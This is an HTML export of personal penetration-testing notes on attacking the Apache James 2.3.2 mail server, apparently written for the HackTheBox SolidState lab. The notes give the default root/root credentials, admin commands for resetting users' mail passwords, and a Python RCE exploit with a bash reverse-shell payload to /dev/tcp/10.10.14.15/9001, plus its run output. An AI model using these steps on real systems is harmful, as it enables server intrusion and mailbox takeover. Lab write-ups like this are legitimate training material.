<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4445 - Apache James</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 4555 - Apache James</h1></strong><br /><code>JAMES</code> / <code>Apache James</code> is an open source SMTP and POP3 mail server written in Java by the Apache Foundation.<br />JAMES runs a remote admin port on port 4445.<br />Since it&#39;s a remote admin port, the sysadmin should probably block remote access to this port via the firewall.<br />However, just becuause port 4445 isn&#39;t open, it doesn&#39;t mean that JAMES isn&#39;t running.<br /><br /><strong><h3>Links</h3></strong><br />• <a href="https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf">https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf</a><br /><br /><strong><h2>## Checklist</h2></strong><br />• Connect<br />   ◇ <code>nc 10.10.10.51 4555 -v</code><br />   ◇ Default credentials = <code>root / root</code><br />   ◇ Useful comamnds<br />      ▪ <div class="codebox"><div class="codebox">listuers<br />setpassword<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;this&nbsp;changes&nbsp;the&nbsp;users&#39;s&nbsp;email&nbsp;password<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;try&nbsp;changing&nbsp;a&nbsp;user&#39;s&nbsp;password&nbsp;the&nbsp;log&nbsp;in&nbsp;via&nbsp;the&nbsp;iremail&nbsp;on&nbsp;port&nbsp;110</div></div><br />• Check version for exploits<br />   ◇ 2.3.2 - RCE - Triggers when a user logs into the system box<br /><br /><strong><h2>## Log In</h2></strong><br />Default credentials are:<br /><code>root / root</code><br /><br /><a href="https://james.apache.org/server/archive/configuration_v2_0.html">https://james.apache.org/server/archive/configuration_v2_0.html</a><br /><a href="https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf">https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf</a><br /><br /><code>nc 10.10.10.51 4555</code><br /><br />Useful commands<br />• <code>listusers</code><br />• <code>setpassword</code><br />   ◇ this changes a user&#39;s email password (i think)<br />   ◇ change a user&#39;s password and then try logging into the iremail via port 110<br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### Apache James Server 2.3.2 - RCE</h3></strong><br /><a href="https://www.exploit-db.com/exploits/35513">https://www.exploit-db.com/exploits/35513</a><br /><br /><strong>Examples</strong><br />• <em>hackthebox SolidState</em><br /><br />This RCE gets triggered when a user logs into the box.<br />It&#39;s authenticated because it needs access to the Remote Admin tool, but if it&#39;s running the default credentials <code>root / root</code> then you&#39;re A-OK.<br /><br />Modify the <code>payload</code> variable in the exploit to whatever you like.<br /><div class="codebox"><div class="codebox">[...]<br />#&nbsp;specify&nbsp;payload<br />#payload&nbsp;=&nbsp;&#39;touch&nbsp;/tmp/proof.txt&#39;&nbsp;#&nbsp;to&nbsp;exploit&nbsp;on&nbsp;any&nbsp;user&nbsp;<br />payload&nbsp;=&nbsp;&#39;/bin/bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.15/9001&nbsp;0&gt;&amp;1&#39;<br />[...]</div></div><br /><br />Run the exploit<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/solidstate/exploits#&nbsp;python&nbsp;james-rce.py&nbsp;10.10.10.51<br />[+]Connecting&nbsp;to&nbsp;James&nbsp;Remote&nbsp;Administration&nbsp;Tool...<br />[+]Creating&nbsp;user...<br />[+]Connecting&nbsp;to&nbsp;James&nbsp;SMTP&nbsp;server...<br />[+]Sending&nbsp;payload...<br />[+]Done!&nbsp;Payload&nbsp;will&nbsp;be&nbsp;executed&nbsp;once&nbsp;somebody&nbsp;logs&nbsp;in.</div></div><br /><br />And log in as a user to trigger the exploit!<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/solidstate#&nbsp;ssh&nbsp;mindy@10.10.10.51<br />mindy@10.10.10.51&#39;s&nbsp;password:&nbsp;<br />[...]</div></div><br /></div>
</body>
</html>
